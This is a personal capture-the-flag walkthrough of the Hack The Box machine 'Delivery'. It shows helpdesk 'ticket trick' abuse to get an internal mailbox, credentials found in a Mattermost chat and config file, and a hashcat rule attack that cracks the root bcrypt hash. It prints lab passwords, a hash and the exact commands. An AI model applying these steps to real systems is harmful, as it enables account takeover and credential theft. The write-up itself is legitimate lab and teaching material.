port open: 22, 80 , 8065
port 8065, http

port 80, http.
> a index page
> also get subdomain: helpdesk.delivery.htb
> >  this is a ticket service, we can create and view ticket.
> >  hint from # Ticket trick helpdesk - https://blueblocksolutions.com/articles/ticket-trick-helpdesk-hacking/
> >  create a ticket with arbitrary mailbox, get a response email format response
> >  ```
> >  dddfff,
>>
>> You may check the status of your ticket, by navigating to the Check Status page using ticket id: 7493265.
>> If you want to add more information to your ticket, just email 7493265@delivery.htb.Thanks,
>> Support Team
>> ```
>> seems we have been registered an user with mailaddress: 7493265@delivery.htb
>> ticket No. 7493265
> we can view the ticket, then on mattermost page, register a account using  7493265@delivery.htb, internal mailbox.
>  back to helpdesk page, refresh ticket, we get response emailn of mattermost and verify the account.

port 8065, http
> a mattermost page, for auth, set hosts 
> after account created, we get in, view some info:
> ```
> Credentials to the server are maildeliverer:Youve_G0t_Mail!
>
Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"
>
Youve_G0t_Mail!
>
PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
> ```

use this credential ssh in as user
`maildeliverer@Delivery:/etc/nginx$ ls sites-available/`
	`default  osticket.conf`
only get 2 services in nginx setting, nothing in apache2 setting

`maildeliverer@Delivery:/etc/nginx$ find / -name mattermost* 2>/dev/null`
```
maildeliverer@Delivery:/etc/nginx$ find / -name mattermost* 2>/dev/null

/etc/systemd/system/multi-user.target.wants/mattermost.service

/opt/mattermost

/opt/mattermost/client/images/mattermost-cloud.svg

/opt/mattermost/client/emoji/mattermost.png

/opt/mattermost/logs/mattermost.log

/opt/mattermost/bin/mattermost

/opt/mattermost/prepackaged_plugins/mattermost-plugin-github-v0.14.0-linux-amd64.tar.gz
```
`maildeliverer@Delivery:/opt/mattermost$ cat config/config.json`
```
"SqlSettings": {

"DriverName": "mysql",

"DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",

"DataSourceReplicas": [],

"DataSourceSearchReplicas": [],

"MaxIdleConns": 20,

"ConnMaxLifetimeMilliseconds": 3600000,

"MaxOpenConns": 300,

"Trace": false,

"AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",

"QueryTimeout": 30,

"DisableDatabaseSearch": false

}
```
get credential of mysql
` root | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO`

put this in a hash file, with the hint of variation
'hashcat  hash aim -m 3200 --user -r /usr/share/hashcat/rules/best66.rule'
```
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
Time.Started.....: Tue Dec 23 20:23:31 2025 (1 sec)
Time.Estimated...: Tue Dec 23 20:23:32 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (aim)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best66.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       15 H/s (1.94ms) @ Accel:4 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 21/66 (31.82%)
Rejected.........: 0/21 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:20-21 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#01...: PleaseSubscribe!21 -> PleaseSubscribe!21
Hardware.Mon.#01.: Util: 21%
```
get root credential

#### lesson learned
- ticket trick, careful view all response and description, you may miss some important
- http service on apache2, nginx and remember to find the one we missed
- hash type check:  we can use hash identifier
- for hashcat bruteforce of bcypt, in the hash username should be wrote in, but hashcat command, use --user to ignor the username !!!!
  ```